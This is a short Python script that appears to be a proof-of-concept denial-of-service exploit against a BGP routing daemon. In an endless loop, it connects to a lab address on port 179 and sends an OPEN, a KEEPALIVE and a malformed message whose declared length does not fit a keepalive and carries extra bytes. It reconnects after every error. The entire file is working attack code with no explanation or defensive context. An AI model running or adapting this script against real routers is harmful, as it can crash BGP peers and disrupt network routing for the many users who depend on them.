import socket
from time import sleep

bgp_open = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00#\x01\x04\x00\x02\x00\x05\xac\x11\x00\x01\xff\xff\x00\x03\x00\x01\x00'
bgp_keepalive = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x13\x04'
bgp_notification = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x15\x04xv'

while True:
    try:
        print("[+] Creating socket...")
        s = socket.socket(type=socket.SOCK_STREAM)
        print("[+] Connecting to server...")
        s.connect(('172.17.0.3', 179))
        s.send(bgp_open)
        sleep(0.0009999999)
        s.send(bgp_keepalive)
        s.send(bgp_notification)
    except KeyboardInterrupt:
        s.close()
        break
    except:
        s.close()
